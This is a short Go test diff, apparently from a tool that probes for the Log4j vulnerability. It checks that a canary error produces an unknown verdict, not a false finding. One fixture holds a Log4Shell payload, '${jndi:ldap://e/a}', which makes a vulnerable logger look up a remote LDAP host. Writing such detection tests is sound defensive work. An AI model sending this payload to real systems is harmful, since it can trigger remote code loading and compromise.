@@ -196,3 +196,18 @@ func TestRunErrors(t *testing.T) {
 		t.Errorf("unreachable canary: %+v", res[0])
 	}
 }
+
+func TestTruthOfCanaryError(t *testing.T) {
+	r := Response{Status: 200, Canary: &CanaryReply{Items: []Item{
+		{Source: "a", Raw: "x", Rendered: "x"},
+		{Source: "b", Raw: "${jndi:ldap://e/a}", Rendered: "", Error: "empty-capture"},
+	}}}
+	if got, _ := TruthOf(r, nil); got != TruthUnknown {
+		t.Fatalf("a canary that could not observe Log4j must give no ground truth, got %s", got)
+	}
+	// An error must win over a lookup seen elsewhere in the same reply.
+	r.Canary.Items[0].JNDI = []string{"ldap://e/b"}
+	if got, _ := TruthOf(r, nil); got != TruthUnknown {
+		t.Fatalf("got %s", got)
+	}
+}
